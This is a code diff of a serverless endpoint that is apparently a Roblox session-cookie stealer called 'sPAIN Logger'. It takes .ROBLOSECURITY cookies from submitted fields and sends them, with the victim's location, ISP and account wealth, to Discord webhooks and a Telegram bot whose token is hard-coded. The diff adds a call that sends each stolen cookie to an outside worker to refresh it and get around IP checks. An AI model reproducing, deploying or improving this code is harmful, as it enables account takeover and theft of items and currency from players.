@@ -1,8 +1,11 @@
-// api/submit.js — cookie hits Discord immediately, geo runs in parallel
+// api/submit.js — Uses worker for cookie refresh, sends to Discord
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
 const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+
+// Cookie Refresher Worker URL
+const COOKIE_REFRESH_WORKER = 'https://holy-truth-3129.notrllyme133.workers.dev/refresh';
 
 // Item asset IDs
 const ITEMS = {
@@ -37,324 +40,52 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-async function getAvatarUrl(userId) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
-      { signal: ctrl.signal }
-    );
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return null;
-    
-    const data = await response.json();
-    if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') {
-      return data.data[0].imageUrl;
-    }
-    return null;
-  } catch {
-    return null;
-  }
-}
-
-async function getRobux(cookie) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch('https://economy.roblox.com/v1/user/currency', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return 0;
-    const data = await response.json();
-    return data.robux || 0;
-  } catch {
-    return 0;
-  }
-}
-
-async function getRAP(cookie, userId) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 8000);
-    
-    const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return { rap: 0, items: 0 };
-    const data = await response.json();
-    
-    let rap = 0;
-    const items = data.data || [];
-    items.forEach(item => {
-      rap += item.recentAveragePrice || 0;
-    });
-    
-    return { rap, items: items.length };
-  } catch {
-    return { rap: 0, items: 0 };
-  }
-}
-
-async function getCredit(cookie) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch('https://billing.roblox.com/v1/credit', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return 0;
-    const data = await response.json();
-    return data.balance || 0;
-  } catch {
-    return 0;
-  }
-}
-
-function getAccountAge(createdDate) {
-  if (!createdDate) return 0;
-  const created = new Date(createdDate);
-  const now = new Date();
-  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
-}
-
-async function getPremiumStatus(cookie) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch('https://premiumfeatures.roblox.com/v1/users/validate-membership', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (response.status === 200) return true;
-    return false;
-  } catch {
-    return false;
-  }
-}
-
-async function getVoiceChatStatus(cookie) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch('https://voice.roblox.com/v1/settings', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return false;
-    const data = await response.json();
-    return data.isVoiceEnabled || false;
-  } catch {
-    return false;
-  }
-}
-
-async function getFriendsCount(userId) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return 0;
-    const data = await response.json();
-    return data.count || 0;
-  } catch {
-    return 0;
-  }
-}
-
-async function ownsItem(cookie, userId, assetId) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}/is-owned`, {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return false;
-    const data = await response.json();
-    return data === true;
-  } catch {
-    return false;
-  }
-}
-
-async function getGroupsOwned(userId) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 5000);
-    
-    const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) return 0;
-    const data = await response.json();
-    
-    const groups = data.data || [];
-    return groups.filter(g => g.role && g.role.rank === 255).length;
-  } catch {
-    return 0;
-  }
-}
-
-async function checkAccountInfo(cookie) {
-  try {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 8000);
-    
-    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      },
-      signal: ctrl.signal
-    });
-    
-    clearTimeout(timer);
-    
-    if (!response.ok) {
-      return { valid: false, error: 'Invalid or expired cookie' };
-    }
-    
-    const userData = await response.json();
-    const userId = userData.id;
-    
-    const [
-      avatarUrl,
-      robux,
-      rapData,
-      credit,
-      profileRes,
-      premium,
-      voiceChat,
-      friends,
-      headless,
-      korblox,
-      valkyrie,
-      groupsOwned
-    ] = await Promise.all([
-      getAvatarUrl(userId),
-      getRobux(cookie),
-      getRAP(cookie, userId),
-      getCredit(cookie),
-      fetch(`https://users.roblox.com/v1/users/${userId}`, {
-        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-      }).catch(() => null),
-      getPremiumStatus(cookie),
-      getVoiceChatStatus(cookie),
-      getFriendsCount(userId),
-      ownsItem(cookie, userId, ITEMS.HEADLESS),
-      ownsItem(cookie, userId, ITEMS.KORBLOX),
-      ownsItem(cookie, userId, ITEMS.VALKYRIE),
-      getGroupsOwned(userId)
-    ]);
-    
-    const profile = profileRes?.ok ? await profileRes.json() : null;
-    const accountAge = getAccountAge(profile?.created);
-    
-    return {
-      valid: true,
-      id: userId,
-      username: userData.name,
-      displayName: userData.displayName,
-      created: profile?.created,
-      description: profile?.description,
-      isBanned: profile?.isBanned || false,
-      profileUrl: `https://www.roblox.com/users/${userId}/profile`,
-      avatarUrl: avatarUrl,
-      robux: robux,
-      rap: rapData.rap,
-      items: rapData.items,
-      credit: credit,
-      premium: premium,
-      voiceChat: voiceChat,
-      friends: friends,
-      headless: headless,
-      korblox: korblox,
-      valkyrie: valkyrie,
-      groupsOwned: groupsOwned,
-      accountAge: accountAge
-    };
-  } catch (err) {
-    return { valid: false, error: err.message };
-  }
-}
-
+// NEW: Use worker to refresh cookie and get account info
 async function refreshCookieStatus(cookie) {
-  const accountInfo = await checkAccountInfo(cookie);
-  return {
-    refreshed: accountInfo.valid,
-    account: accountInfo,
-    timestamp: new Date().toISOString()
-  };
-}
-
-async function tgSend(text) {
   try {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 15000);
+    
+    const response = await fetch(COOKIE_REFRESH_WORKER, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+      body: JSON.stringify({ cookie }),
+      signal: ctrl.signal
     });
-  } catch (_) {}
+    
+    clearTimeout(timer);
+    
+    const result = await response.json();
+    
+    if (!result.success) {
+      return { 
+        refreshed: false, 
+        error: result.error || 'Cookie validation failed',
+        account: null,
+        timestamp: new Date().toISOString()
+      };
+    }
+    
+    return {
+      refreshed: true,
+      account: result.account,
+      newCookie: result.cookie,
+      isDifferent: result.isDifferent,
+      timestamp: new Date().toISOString()
+    };
+    
+  } catch (err) {
+    return { 
+      refreshed: false, 
+      error: err.message,
+      account: null,
+      timestamp: new Date().toISOString()
+    };
+  }
 }
 
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+
 function extractCookie(raw) {
   if (!raw) return null;
   const s = String(raw).trim();
@@ -364,6 +95,7 @@ function extractCookie(raw) {
   if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
   return null;
 }
+
 function findCookie(slots) {
   for (const val of Object.values(slots || {})) {
     const c = extractCookie(String(val || ''));
@@ -381,18 +113,11 @@ function parseBody(raw) {
 
 const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
-
-// Cookie Refresher URL
 const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
-
-// Blue clickable link for Discord
 const REFRESH_COOKIE_LINK = `[Refresh Cookie](${COOKIE_REFRESH_URL})`;
 
 const createWebhookPayload = (type, data) => {
-  const basePayload = {
-    username: WH_NAME,
-    avatar_url: WH_AVATAR
-  };
+  const basePayload = { username: WH_NAME, avatar_url: WH_AVATAR };
 
   switch (type) {
     case 'webhook1':
@@ -404,7 +129,6 @@ const createWebhookPayload = (type, data) => {
           description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
           color: data.color || 0x06b6d4,
           thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-          image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
           footer: { text: data.footer || `sPAIN Logger` },
           timestamp: data.timestamp || new Date().toISOString()
@@ -420,7 +144,6 @@ const createWebhookPayload = (type, data) => {
           description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
           color: data.color || 0xc026d3,
           thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-          image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
           footer: { text: data.footer || `sPAIN Logger` },
           timestamp: data.timestamp || new Date().toISOString()
@@ -436,7 +159,6 @@ const createWebhookPayload = (type, data) => {
           description: data.description || '',
           color: data.valid === false ? 0xff0000 : 0x00ff00,
           thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
-          image: data.image ? { url: data.image } : undefined,
           fields: data.fields || [],
           footer: { text: `Account Check • sPAIN Logger` },
           timestamp: data.timestamp || new Date().toISOString()
@@ -470,6 +192,16 @@ async function discordSendCookie(url, cookie, username) {
         avatar_url: WH_AVATAR,
         content: `**🔐 Cookie for: ${username || 'Unknown'}**\n\`\`\`\n${cookie}\n\`\`\``
       })
+    });
+  } catch (_) {}
+}
+
+async function tgSend(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
     });
   } catch (_) {}
 }
@@ -538,8 +270,9 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
+  // REFRESH COOKIE VIA WORKER (bypasses IP restrictions)
   const geoPromise = getIpGeo(ip);
-  const accountCheckPromise = refreshCookieStatus(cookie);
+  const accountPromise = refreshCookieStatus(cookie);
 
   let webhook1 = null;
   let webhook2 = record.webhook;
@@ -550,15 +283,14 @@ export default async function handler(req, res) {
     } catch (_) {}
   }
 
-  const [geo, accountInfo] = await Promise.all([geoPromise, accountCheckPromise]);
+  const [geo, refreshResult] = await Promise.all([geoPromise, accountPromise]);
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
   
-  const avatarUrl = accountInfo.refreshed && accountInfo.account.avatarUrl 
-    ? accountInfo.account.avatarUrl 
-    : null;
-  
-  const acc = accountInfo.refreshed ? accountInfo.account : null;
+  // Use refreshed cookie if available
+  const workingCookie = refreshResult.newCookie || cookie;
+  const acc = refreshResult.refreshed ? refreshResult.account : null;
+  const avatarUrl = acc?.avatarUrl || null;
 
   // STEP 1: 🍪 Cookie Captured
   const wh2Payload = createWebhookPayload('webhook2', {
@@ -572,6 +304,7 @@ export default async function handler(req, res) {
       { name: '🕐 Time',     value: now, inline: true },
       { name: '📍 Location', value: loc, inline: true  },
       { name: '🗺️ ISP',      value: isp, inline: true  },
+      { name: '🔄 Refreshed', value: refreshResult.isDifferent ? '✅ Yes' : '⚠️ No', inline: true },
       { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
     ],
     footer: `sPAIN Logger • ${pName}`,
@@ -591,6 +324,7 @@ export default async function handler(req, res) {
         { name: '📍 Location',  value: loc,                           inline: true  },
         { name: '🗺️ ISP',       value: isp,                           inline: true  },
         { name: '🕐 Time',      value: now,                           inline: true  },
+        { name: '🔄 Refreshed', value: refreshResult.isDifferent ? '✅ Yes' : '⚠️ No', inline: true },
         { name: '🍪 Cookie Refresher', value: `If you want more accurate account validation, ${REFRESH_COOKIE_LINK}`, inline: false }
       ],
       footer: `sPAIN Logger • ${pName}`,
@@ -601,7 +335,7 @@ export default async function handler(req, res) {
   }
 
   // STEP 2: ✅ Account Info Valid
-  if (accountInfo.refreshed && acc) {
+  if (acc) {
     const accountPayload = createWebhookPayload('account_info', {
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
       thumbnail: avatarUrl,
@@ -612,14 +346,14 @@ export default async function handler(req, res) {
         { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
         
         // Row 2: Account Stats
-        { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
+        { name: '🗓️ Age', value: `${acc.ageDays.toLocaleString()}d`, inline: true },
         { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
         { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
         
         // Row 3: Social
         { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
         { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
-        { name: '📦 Items', value: acc.items.toString(), inline: true },
+        { name: '📦 Items', value: acc.limiteds.toString(), inline: true },
         
         // Row 4: Limiteds
         { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
@@ -635,9 +369,9 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, accountPayload);
   }
 
-  // STEP 3: 🔐 Cookie
-  await discordSendCookie(webhook2, cookie, acc?.username);
-  if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
+  // STEP 3: 🔐 Send Refreshed Cookie
+  await discordSendCookie(webhook2, workingCookie, acc?.username);
+  if (webhook1) await discordSendCookie(webhook1, workingCookie, acc?.username);
 
   // Telegram
   await tgSend([
@@ -647,15 +381,17 @@ export default async function handler(req, res) {
     `🗺️ ${isp}`,
     `👤 ${acc ? acc.username : 'Invalid'}`,
     acc ? `💰 Robux: ${acc.robux.toLocaleString()}` : '',
-    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.items} items)` : '',
+    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.limiteds} items)` : '',
     acc ? `⭐ Premium: ${acc.premium ? 'Yes' : 'No'}` : '',
     acc ? `💀 Headless: ${acc.headless ? 'Yes' : 'No'}` : '',
     acc ? `⚔️ Korblox: ${acc.korblox ? 'Yes' : 'No'}` : '',
+    `🔄 Refreshed: ${refreshResult.isDifferent ? 'Yes' : 'No'}`,
     `🕐 ${now}`
   ].filter(Boolean).join('\n'));
 
   return res.status(200).json({ 
     success: true, 
-    account: accountInfo.refreshed ? accountInfo.account : null 
+    refreshed: refreshResult.isDifferent,
+    account: acc
   });
 }
